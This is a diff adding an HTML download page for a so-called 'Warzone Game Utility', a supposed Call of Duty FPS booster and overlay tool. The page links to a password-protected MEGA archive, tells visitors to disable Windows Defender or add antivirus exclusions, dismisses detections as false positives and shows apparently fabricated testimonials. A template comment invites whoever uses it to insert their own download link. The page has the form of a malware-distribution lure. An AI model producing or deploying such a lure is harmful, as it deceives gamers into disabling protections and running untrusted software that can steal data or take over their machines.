@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Warzone Game Utility - Official Download</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            color: #e0e0e0;
+            font-family: 'Inter', sans-serif;
+            overflow-x: hidden;
+        }
+
+        /* Анимированный фон */
+        .bg-glow {
+            position: fixed;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle at 50% 50%, rgba(255,102,0,0.08) 0%, transparent 60%);
+            animation: rotate 30s linear infinite;
+            z-index: 0;
+            pointer-events: none;
+        }
+        @keyframes rotate {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 40px 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Hero */
+        .hero {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        .hero h1 {
+            font-size: 48px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #ff6600, #ffaa00);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 10px;
+            text-shadow: 0 0 30px rgba(255,102,0,0.3);
+        }
+        .hero p {
+            font-size: 18px;
+            color: #aaa;
+            margin-bottom: 20px;
+        }
+
+        /* Карточки функций */
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin: 30px 0;
+        }
+        .feature-card {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,102,0,0.2);
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(5px);
+        }
+        .feature-card:hover {
+            border-color: #ff6600;
+            box-shadow: 0 0 20px rgba(255,102,0,0.2);
+            transform: translateY(-3px);
+        }
+        .feature-card .icon {
+            font-size: 30px;
+            margin-bottom: 10px;
+        }
+        .feature-card h3 {
+            color: #ff6600;
+            margin-bottom: 5px;
+            font-size: 16px;
+            font-weight: 600;
+        }
+        .feature-card p {
+            color: #ccc;
+            font-size: 13px;
+            line-height: 1.4;
+        }
+
+        /* Кнопка */
+        .btn {
+            display: inline-block;
+            margin: 30px 0;
+            padding: 18px 60px;
+            background: linear-gradient(135deg, #ff6600, #ff3300);
+            color: #fff;
+            text-decoration: none;
+            font-size: 20px;
+            font-weight: 700;
+            border-radius: 50px;
+            box-shadow: 0 0 25px rgba(255,102,0,0.5);
+            animation: pulse 2s infinite;
+            transition: transform 0.2s;
+        }
+        .btn:hover {
+            transform: scale(1.05);
+        }
+        @keyframes pulse {
+            0% { box-shadow: 0 0 15px rgba(255,102,0,0.5); }
+            50% { box-shadow: 0 0 35px rgba(255,102,0,0.8); }
+            100% { box-shadow: 0 0 15px rgba(255,102,0,0.5); }
+        }
+
+        /* Шаги установки */
+        .steps {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 20px;
+            margin: 40px 0;
+        }
+        .step {
+            background: #111;
+            border-left: 3px solid #ff6600;
+            padding: 15px 20px;
+            border-radius: 8px;
+            width: 200px;
+            text-align: left;
+        }
+        .step .num {
+            color: #ff6600;
+            font-weight: 800;
+            font-size: 18px;
+        }
+
+        /* Отзывы */
+        .testimonials {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 15px;
+            margin: 30px 0;
+        }
+        .testimonial {
+            background: rgba(255,255,255,0.03);
+            padding: 20px;
+            border-radius: 10px;
+            border: 1px solid rgba(255,102,0,0.15);
+        }
+        .testimonial .quote {
+            font-style: italic;
+            color: #ddd;
+            margin-bottom: 10px;
+        }
+        .testimonial .author {
+            color: #ff6600;
+            font-weight: 600;
+        }
+
+        .warning {
+            background: #1a1a1a;
+            border-left: 4px solid #ff6600;
+            padding: 15px 20px;
+            margin: 30px 0;
+            border-radius: 6px;
+            color: #ffb380;
+            font-size: 14px;
+        }
+        .footer {
+            text-align: center;
+            color: #555;
+            margin-top: 40px;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-glow"></div>
+    <div class="container">
+        <div class="hero">
+            <h1>WARZONE GAME UTILITY</h1>
+            <p>Professional-grade performance enhancer, audio optimizer, and overlay tool for Call of Duty</p>
+        </div>
+
+        <div class="features-grid">
+            <div class="feature-card">
+                <div class="icon">🎯</div>
+                <h3>Custom Crosshair</h3>
+                <p>Choose from dozens of precision overlays for any weapon.</p>
+            </div>
+            <div class="feature-card">
+                <div class="icon">⚡</div>
+                <h3>FPS Booster</h3>
+                <p>Aggressive system tweaks to push every last frame.</p>
+            </div>
+            <div class="feature-card">
+                <div class="icon">🎧</div>
+                <h3>Audio Enhancer</h3>
+                <p>Footsteps, reloads, and distant shots become crystal clear.</p>
+            </div>
+            <div class="feature-card">
+                <div class="icon">🔧</div>
+                <h3>Config Manager</h3>
+                <p>Save, load, and share your perfect setup.</p>
+            </div>
+            <div class="feature-card">
+                <div class="icon">📡</div>
+                <h3>Stream Safe</h3>
+                <p>Overlays invisible to streaming and recording software.</p>
+            </div>
+            <div class="feature-card">
+                <div class="icon">💻</div>
+                <h3>Windows 10/11</h3>
+                <p>Fully compatible with the latest Windows updates.</p>
+            </div>
+        </div>
+
+        <div style="text-align:center;">
+            <!-- ВСТАВЬ СВОЮ ПОЛНУЮ MEGA-ССЫЛКУ -->
+            <a class="btn" href="https://mega.nz/file/kUlDjBDK#zxFgjjmFKujEhgBC0TMkxbM6g5P5HF-MvyrqSNO_ZN4" target="_blank" rel="noopener noreferrer">Download Now</a>
+            <p style="color:#aaa; margin-top:10px;">Archive password: <b>cod2026</b></p>
+        </div>
+
+        <div class="warning">
+            <b>⚠️ Important:</b> This tool uses low-level system access to provide overlays and optimizations. Most antivirus software will show a false positive. Disable Windows Defender or add the folder to exclusions before running.
+        </div>
+
+        <div class="testimonials">
+            <div class="testimonial">
+                <p class="quote">"The audio enhancer alone is worth it. I hear enemies before they know I'm there."</p>
+                <p class="author">— WarzonePro2026</p>
+            </div>
+            <div class="testimonial">
+                <p class="quote">"Finally a tool that doesn't crash mid-game. FPS boost is real."</p>
+                <p class="author">— CallOfDutyFan</p>
+            </div>
+            <div class="testimonial">
+                <p class="quote">"Stream-safe overlays saved my channel. No more black screens."</p>
+                <p class="author">— TwitchStreamer</p>
+            </div>
+        </div>
+
+        <div class="footer">© 2026 Warzone Tools. Not affiliated with Activision.</div>
+    </div>
+</body>
+</html>
